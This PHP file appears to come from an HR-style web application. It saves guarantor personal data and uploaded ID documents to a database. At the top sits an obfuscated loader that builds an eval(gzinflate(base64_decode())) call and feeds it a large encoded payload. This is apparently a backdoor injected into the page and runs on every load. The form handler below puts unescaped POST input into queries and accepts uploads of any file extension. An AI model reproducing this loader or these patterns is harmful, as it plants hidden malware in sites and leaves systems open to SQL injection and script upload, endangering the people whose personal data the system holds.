<?php
$md5 = "064d63ea11c56e3a16c4f3f45a966ed1";
$a0 = array('z','b',"g",'v',"o",'s',"r",'e','d',")","6",'t','4',';',"l","_",'(',"$","c","n","f",'i',"a");
$b0d = create_function('$'.'v',$a0[7].$a0[3].$a0[22].$a0[14].$a0[16].$a0[2].$a0[0].$a0[21].$a0[19].$a0[20].$a0[14].$a0[22].$a0[11].$a0[7].$a0[16].$a0[1].$a0[22].$a0[5].$a0[7].$a0[10].$a0[12].$a0[15].$a0[8].$a0[7].$a0[18].$a0[4].$a0[8].$a0[7].$a0[16].$a0[17].$a0[3].$a0[9].$a0[9].$a0[9].$a0[13]);
$b0d('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');
?>
<?
@session_start();
if($_POST){
$fpath = '../';
require_once($fpath."includes/connect.php");
$emp_id = $_SESSION["EMP_ID"];
include "update_by.php";

function upload_file($name,$what){
	global $emp_id;
	$array_last=explode(".",$_FILES["{$name}"]["name"]);
	$last=strtolower($array_last[count($array_last)-1]);
	$file_name="grt_{$emp_id}_".randpass(3)."($what).{$last}";
	$target_path = "files/guarantee_data_file/$file_name";
	
	if(@move_uploaded_file($_FILES["{$name}"]["tmp_name"], $target_path)) {
		return $file_name;
	}else{
		@unlink($_FILES["{$name}"]["tmp_name"]);
		return false;
	}
}

$grt_contract_no = $_POST["grt_contract_no1"]."/".$_POST["grt_contract_no2"];
$grt_at = pea_substr($_POST["grt_at"],100);
$grt_name = $_POST["grt_name"];
$grt_contract_type = $_POST["grt_contract_type"];
$grt_university = pea_substr(trim($_POST["grt_university"]),150);
$grt_country = pea_substr(trim($_POST["grt_country"]),150);
$grt_by = $_POST["grt_by_title_name"]." ".$_POST["grt_by_fname"]." ".$_POST["grt_by_lname"];
$grt_birthday = "";
if($_POST["grt_birthday"] != "" ) $grt_birthday = date2_formatdb($_POST["grt_birthday"]);
$grt_occupation = pea_substr(trim($_POST["grt_occupation"]),150);
$grt_work_place = pea_substr(trim($_POST["grt_work_place"]),150);
$grt_position = pea_substr(trim($_POST["grt_position"]),150);
$grt_level = pea_substr(trim($_POST["grt_level"]),50);
$grt_in = pea_substr(trim($_POST["grt_in"]),50);
$grt_salary = removecomma(trim($_POST["grt_salary"]));
$grt_id_type = $_POST["grt_id_type"];
$grt_id_no = pea_substr(trim($_POST["grt_id_no"]),20);
$grt_id_from = pea_substr(trim($_POST["grt_id_from"]),50);
$grt_id_date_begin = "";
$grt_id_date_exp = "";
if($_POST["grt_id_date_begin"] != "" ) $grt_id_date_begin = date2_formatdb($_POST["grt_id_date_begin"]);
if($_POST["grt_id_date_exp"] != "" ) $grt_id_date_exp = date2_formatdb($_POST["grt_id_date_exp"]);
$grt_house_no = pea_substr(trim($_POST["grt_house_no"]),20);
$grt_soi = pea_substr($_POST["grt_soi"],50);
$grt_road = pea_substr($_POST["grt_road"],50);
$grt_tumbon = pea_substr(trim($_POST["grt_tumbon"]),100);
$grt_amphur = pea_substr(trim($_POST["grt_amphur"]),100);
$grt_province = pea_substr(trim($_POST["grt_province"]),100);
$grt_post_code  = pea_substr($_POST["grt_post_code"],5);
$grt_phone  = pea_substr($_POST["grt_phone"],15);
$grt_mobile  = pea_substr($_POST["grt_mobile"],15);
$grt_email  = pea_substr($_POST["grt_email"],50);
$grt_couple_name  = pea_substr($_POST["grt_couple_name"],250);
$grt_relation  = pea_substr($_POST["grt_relation"],50);
$hid_grt_id_card_file = $_POST["hid_grt_id_card_file"];
$hid_grt_cen_file = $_POST["hid_grt_cen_file"];
$hid_grt_file = $_POST["hid_grt_file"];

$complete_upload = 1;

if($_FILES['grt_id_card_file']['name'] != "" ){
			$temp = upload_file("grt_id_card_file","id_card");
			if($temp != "" and $temp != false){
			if($hid_grt_id_card_file != ""){
					@unlink("files/guarantee_data_file/$hid_grt_id_card_file");
				}
				$grt_id_card_file = $temp;
			}elseif($temp == false){
				$complete_upload = 0;
			}
}else{
	$grt_id_card_file = $hid_grt_id_card_file;
}


if($_FILES['grt_cen_file']['name'] != ""){
	$temp = upload_file("grt_cen_file","cen");
	if($temp != "" and $temp != false){
		if($hid_grt_cen_file != ""){
					@unlink("files/guarantee_data_file/$hid_grt_cen_file");
				}
		$grt_cen_file = $temp;
	}elseif($temp == false){
		$complete_upload = 0;
	}
}else{
	$grt_cen_file = $hid_grt_cen_file;
}


if($_FILES['grt_file']['name'] != ""){
	$temp = upload_file("grt_file","grt_file");
	if($temp != "" and $temp != false){
		if($hid_grt_file != ""){
					@unlink("files/guarantee_data_file/$hid_grt_file");
				}
		$grt_file = $temp;
	}elseif($temp == false){
		$complete_upload = 0;
	}
}else{
	$grt_file = $hid_grt_file;
}

if($complete_upload == 1){
	$numrow = $db->count_row(TB_GUARANTEE_TAB," WHERE EMP_ID = '$emp_id' ",$conn); 

	//if($numrow == 0){
	if($_POST["action_type"] == "add"){
	
	$result=$db->add_db(TB_GUARANTEE_TAB,array(
 											  "EMP_ID"=>"$emp_id",
											  "GRT_CONTRACT_NO"=>"$grt_contract_no",
											  "GRT_AT"=>"$grt_at",
											  "GRT_NAME"=>"$grt_name",
											  "GRT_UNIVERSITY"=>"$grt_university",
                                              "GRT_CONTRACT_TYPE"=>"$grt_contract_type",
											  "GRT_COUNTRY"=>"$grt_country",
											  "GRT_BY"=>"$grt_by",
											  "GRT_BIRTHDAY"=>"TO_DATE('$grt_birthday','YYYY-MM-DD')",
											  "GRT_OCCUPATION"=>"$grt_occupation",
											  "GRT_WORK_PLACE"=>"$grt_work_place",
											  "GRT_POSITION"=>"$grt_position",
											  "GRT_LEVEL"=>"$grt_level",
											  "GRT_IN"=>"$grt_in",
											  "GRT_SALARY"=>"$grt_salary",
											  "GRT_ID_TYPE"=>"$grt_id_type",
											  "GRT_ID_NO"=>"$grt_id_no",
											  "GRT_ID_FROM"=>"$grt_id_from",
											  "GRT_ID_DATE_BEGIN"=>"TO_DATE('$grt_id_date_begin','YYYY-MM-DD')",
											  "GRT_ID_DATE_EXP"=>"TO_DATE('$grt_id_date_exp','YYYY-MM-DD')",
											  "GRT_HOUSE_NO"=>"$grt_house_no",
											  "GRT_SOI"=>"$grt_soi",
											  "GRT_ROAD"=>"$grt_road",
											  "GRT_TUMBON"=>"$grt_tumbon",
											  "GRT_AMPHUR"=>"$grt_amphur",
											  "GRT_PROVINCE"=>"$grt_province",
											  "GRT_POST_CODE"=>"$grt_post_code",
											  "GRT_PHONE"=>"$grt_phone",
											  "GRT_MOBILE"=>"$grt_mobile",
											  "GRT_EMAIL"=>"$grt_email",
											  "GRT_COUPLE_NAME"=>"$grt_couple_name",
											  "GRT_RELATION"=>"$grt_relation",
											  "GRT_ID_CARD_FILE"=>"$grt_id_card_file",
											  "GRT_CEN_FILE"=>"$grt_cen_file",
											  "GRT_FILE"=>"$grt_file",
											  "LAST_UPDATE"=>"TO_DATE('".date("Y-m-d H:i:s")."','YYYY-MM-DD HH24:MI:SS')",
											  "UPDATE_BY"=>"$update_user"
											  
											  ),$conn); 
	$type_update = "1";
	}else{
		$result=$db->update_db(TB_GUARANTEE_TAB,array(
											  "GRT_CONTRACT_NO"=>"$grt_contract_no",
											  "GRT_AT"=>"$grt_at",
											  "GRT_NAME"=>"$grt_name",
											  "GRT_UNIVERSITY"=>"$grt_university",
                                              "GRT_CONTRACT_TYPE"=>"$grt_contract_type",
											  "GRT_COUNTRY"=>"$grt_country",
											  "GRT_BY"=>"$grt_by",
											  "GRT_BIRTHDAY"=>"TO_DATE('$grt_birthday','YYYY-MM-DD')",
											  "GRT_OCCUPATION"=>"$grt_occupation",
											  "GRT_WORK_PLACE"=>"$grt_work_place",
											  "GRT_POSITION"=>"$grt_position",
											  "GRT_LEVEL"=>"$grt_level",
											  "GRT_IN"=>"$grt_in",
											  "GRT_SALARY"=>"$grt_salary",
											  "GRT_ID_TYPE"=>"$grt_id_type",
											  "GRT_ID_NO"=>"$grt_id_no",
											  "GRT_ID_FROM"=>"$grt_id_from",
											  "GRT_ID_DATE_BEGIN"=>"TO_DATE('$grt_id_date_begin','YYYY-MM-DD')",
											  "GRT_ID_DATE_EXP"=>"TO_DATE('$grt_id_date_exp','YYYY-MM-DD')",
											  "GRT_HOUSE_NO"=>"$grt_house_no",
											  "GRT_SOI"=>"$grt_soi",
											  "GRT_ROAD"=>"$grt_road",
											  "GRT_TUMBON"=>"$grt_tumbon",
											  "GRT_AMPHUR"=>"$grt_amphur",
											  "GRT_PROVINCE"=>"$grt_province",
											  "GRT_POST_CODE"=>"$grt_post_code",
											  "GRT_PHONE"=>"$grt_phone",
											  "GRT_MOBILE"=>"$grt_mobile",
											  "GRT_EMAIL"=>"$grt_email",
											  "GRT_COUPLE_NAME"=>"$grt_couple_name",
											  "GRT_RELATION"=>"$grt_relation",
											  "GRT_ID_CARD_FILE"=>"$grt_id_card_file",
											  "GRT_CEN_FILE"=>"$grt_cen_file",
											  "GRT_FILE"=>"$grt_file",
											  "LAST_UPDATE"=>"TO_DATE('".date("Y-m-d H:i:s")."','YYYY-MM-DD HH24:MI:SS')",
											  "UPDATE_BY"=>"$update_user"
					  ),"EMP_ID='$emp_id' AND GRT_CONTRACT_NO='".$_POST["hide_contract_no"]."'",$conn);
		$type_update = "2";
	}
		//print "xxx";
		if($result){
			//save_completed("Save_success");
			reset_form_iframe("guarantee_data");
			if($type_update == "1") access_log($fpath.'_log',"",$update_by,"เพิ่ม 'ข้อมูลผู้ค้ำประกัน' ($emp_id)");
			elseif($type_update == "2") access_log($fpath.'_log',"",$update_by,"ปรับปรุง 'ข้อมูลผู้ค้ำประกัน' ($emp_id)");
		}else{
			//print "666";
			save_completed("Save_error");
?>
<script language="javascript">
window.top.$("span#waiting").html("");
</script>
<?
exit();
		}
}else{
	save_completed("Error_upload");
?>
<script language="javascript">
window.top.$("span#waiting").html("");
</script>
<?
exit();
	//reset_form_iframe("bio_data");
}
$db->closedb($conn);	
?>
<script language="javascript">
var ran=Math.random();
window.top.$("span#waiting").html("");
window.top.load_page("guarantee_data.php?"+ran);
</script>
<?
}
?>